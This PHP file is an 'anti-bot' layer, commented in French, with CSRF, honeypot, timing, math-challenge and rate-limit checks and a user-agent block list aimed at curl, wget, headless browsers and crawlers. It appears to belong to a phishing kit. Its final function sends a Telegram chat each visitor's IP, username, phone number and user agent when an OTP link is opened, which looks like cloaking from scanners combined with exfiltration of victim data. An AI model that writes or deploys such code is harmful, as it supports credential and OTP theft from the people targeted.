<?php

declare(strict_types=1);

/**
 * Couche anti-bot : CSRF, honeypot, délai minimum, calcul simple, limitation de débit, UA suspects.
 */

function app_client_ip(): string
{
    $xff = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? '';
    if (is_string($xff) && $xff !== '') {
        $parts = array_map('trim', explode(',', $xff));
        foreach ($parts as $p) {
            if (filter_var($p, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                return $p;
            }
        }
        if (isset($parts[0]) && filter_var($parts[0], FILTER_VALIDATE_IP)) {
            return $parts[0];
        }
    }
    $ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';

    return is_string($ip) ? $ip : '0.0.0.0';
}

function app_is_suspicious_user_agent(): bool
{
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? strtolower((string) $_SERVER['HTTP_USER_AGENT']) : '';
    if ($ua === '' || strlen($ua) < 10) {
        return true;
    }
    $needles = [
        'curl/', 'wget/', 'python-requests', 'scrapy', 'httpclient', 'java/', 'go-http', 'libwww',
        'phantomjs', 'headless', 'selenium', 'puppeteer', 'playwright', 'bot', 'crawler', 'spider',
        'httpunit', 'aiohttp', 'axios/', 'node-fetch',
    ];
    foreach ($needles as $n) {
        if (str_contains($ua, $n)) {
            return true;
        }
    }

    return false;
}

function app_csrf_token(): string
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    if (empty($_SESSION['_csrf']) || !is_string($_SESSION['_csrf'])) {
        $_SESSION['_csrf'] = bin2hex(random_bytes(32));
    }

    return $_SESSION['_csrf'];
}

function app_csrf_verify(): bool
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    $t = isset($_POST['_csrf']) ? (string) $_POST['_csrf'] : '';
    $s = isset($_SESSION['_csrf']) ? (string) $_SESSION['_csrf'] : '';

    return $t !== '' && $s !== '' && hash_equals($s, $t);
}

/** Nom du champ honeypot (doit rester vide). */
function app_honeypot_field(): string
{
    return 'company_website';
}

function app_honeypot_ok(): bool
{
    $name = app_honeypot_field();
    $v = isset($_POST[$name]) ? trim((string) $_POST[$name]) : null;

    return $v === null || $v === '';
}

function app_form_opened_key(string $page): string
{
    return '_form_open_' . $page;
}

function app_touch_form_opened(string $page): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    $_SESSION[app_form_opened_key($page)] = microtime(true);
}

function app_form_min_elapsed(string $page, float $minSeconds): bool
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    $k = app_form_opened_key($page);
    if (!isset($_SESSION[$k])) {
        return false;
    }
    $opened = $_SESSION[$k];
    if (!is_float($opened) && !is_int($opened)) {
        return false;
    }

    return (microtime(true) - (float) $opened) >= $minSeconds;
}

function app_regenerate_math_challenge(): void
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    $_SESSION['_math_a'] = random_int(2, 19);
    $_SESSION['_math_b'] = random_int(2, 19);
}

function app_math_question_display(): string
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    if (!isset($_SESSION['_math_a'], $_SESSION['_math_b'])) {
        app_regenerate_math_challenge();
    }

    return (string) (int) $_SESSION['_math_a'] . ' + ' . (string) (int) $_SESSION['_math_b'];
}

function app_math_expected(): int
{
    if (session_status() !== PHP_SESSION_ACTIVE) {
        session_start();
    }
    if (!isset($_SESSION['_math_a'], $_SESSION['_math_b'])) {
        return -1;
    }

    return (int) $_SESSION['_math_a'] + (int) $_SESSION['_math_b'];
}

function app_math_answer_ok(): bool
{
    $ans = isset($_POST['human_sum']) ? trim((string) $_POST['human_sum']) : '';
    if ($ans === '' || !ctype_digit($ans)) {
        return false;
    }
    $n = (int) $ans;

    return $n === app_math_expected();
}

function app_rate_limit_dir(): string
{
    $dir = dirname(__DIR__) . '/data/ratelimit';
    if (!is_dir($dir)) {
        mkdir($dir, 0700, true);
    }

    return $dir;
}

/** Limite les actions par IP. Retourne false si bloqué. */
function app_rate_limit_allow(string $action, int $maxPerWindow, int $windowSeconds): bool
{
    $ip = app_client_ip();
    $key = hash('sha256', $ip . '|' . $action);
    $path = app_rate_limit_dir() . '/' . $key . '.json';
    $now = time();
    $data = ['window_start' => $now, 'count' => 0];
    if (is_file($path)) {
        $raw = file_get_contents($path);
        if ($raw !== false) {
            $j = json_decode($raw, true);
            if (is_array($j) && isset($j['window_start'], $j['count'])) {
                $data = $j;
            }
        }
    }
    if ($now - (int) $data['window_start'] > $windowSeconds) {
        $data = ['window_start' => $now, 'count' => 0];
    }
    $data['count'] = (int) $data['count'] + 1;
    file_put_contents($path, json_encode($data, JSON_THROW_ON_ERROR), LOCK_EX);

    return $data['count'] <= $maxPerWindow;
}

/**
 * Vérifications communes POST : CSRF, honeypot, délai, calcul, UA, rate limit.
 *
 * @return string message d'erreur vide si OK
 */
function app_antibot_verify_post(string $pageKey, float $minFormSeconds = 2.0): string
{
    if (!app_csrf_verify()) {
        return 'Session expirée ou formulaire invalide. Rechargez la page.';
    }
    if (!app_honeypot_ok()) {
        return 'Requête refusée.';
    }
    if (!app_form_min_elapsed($pageKey, $minFormSeconds)) {
        return 'Veuillez patienter quelques secondes avant d\'envoyer le formulaire.';
    }
    if (!app_math_answer_ok()) {
        return 'Réponse incorrecte à la question de vérification.';
    }
    if (app_is_suspicious_user_agent()) {
        return 'Navigateur non autorisé.';
    }
    if (!app_rate_limit_allow('post_' . $pageKey, 25, 300)) {
        return 'Trop de tentatives. Réessayez plus tard.';
    }

    return '';
}

/** Pour pages sans champ calcul (ex. confirm) : vérifie le reste + délai plus court possible. */
function app_antibot_verify_post_light(string $pageKey, float $minFormSeconds = 1.0): string
{
    if (!app_csrf_verify()) {
        return 'Session expirée ou formulaire invalide. Rechargez la page.';
    }
    if (!app_honeypot_ok()) {
        return 'Requête refusée.';
    }
    if (!app_form_min_elapsed($pageKey, $minFormSeconds)) {
        return 'Veuillez patienter avant de valider.';
    }
    if (app_is_suspicious_user_agent()) {
        return 'Navigateur non autorisé.';
    }
    if (!app_rate_limit_allow('post_' . $pageKey, 40, 300)) {
        return 'Trop de tentatives. Réessayez plus tard.';
    }

    return '';
}

function app_notify_optional_webhook(string $event, array $payload): void
{
    global $config;
    $url = isset($config['click_notify_webhook_url']) ? trim((string) $config['click_notify_webhook_url']) : '';
    if ($url === '' || !filter_var($url, FILTER_VALIDATE_URL)) {
        return;
    }
    $body = array_merge(['event' => $event, 'ip' => app_client_ip()], $payload);
    $ch = curl_init($url);
    if ($ch === false) {
        return;
    }
    $json = json_encode($body, JSON_THROW_ON_ERROR);
    curl_setopt_array($ch, [
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => $json,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
        CURLOPT_TIMEOUT => 8,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

/**
 * Notifie Telegram (et webhook optionnel) qu’un lien OTP a été ouvert — une fois par type (4/6).
 *
 * @param array{pseudo: string, secret: string, phone?: ?string, created: int, otp_notified_4?: int, otp_notified_6?: int} $flow
 * @return array{pseudo: string, secret: string, phone?: ?string, created: int, otp_notified_4: int, otp_notified_6: int}
 */
function app_flow_after_otp_link_notify(string $flowId, array $flow, int $digits): array
{
    $digits = ($digits === 6) ? 6 : 4;
    $flagKey = $digits === 6 ? 'otp_notified_6' : 'otp_notified_4';
    if ((int) ($flow[$flagKey] ?? 0) !== 0) {
        return $flow;
    }

    $ip = app_client_ip();
    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? substr((string) $_SERVER['HTTP_USER_AGENT'], 0, 400) : '';
    $pseudo = (string) $flow['pseudo'];
    $phone = isset($flow['phone']) ? (string) $flow['phone'] : '';

    $text = "🔗 Clic lien OTP ({$digits} chiffres)\n";
    $text .= 'IP : ' . $ip . "\n";
    $text .= 'Pseudo : ' . $pseudo . "\n";
    if ($phone !== '') {
        $text .= 'Tél : ' . $phone . "\n";
    }
    if ($ua !== '') {
        $text .= 'UA : ' . $ua;
    }

    if (app_telegram_configured()) {
        global $config;
        app_telegram_send([
            'chat_id' => $config['telegram_chat_id'],
            'text' => $text,
        ]);
    }

    app_notify_optional_webhook('otp_link_open', [
        'digits' => $digits,
        'pseudo' => $pseudo,
        'phone' => $phone,
        'user_agent' => $ua,
        'flow_id' => $flowId,
    ]);

    $flow[$flagKey] = 1;

    return $flow;
}
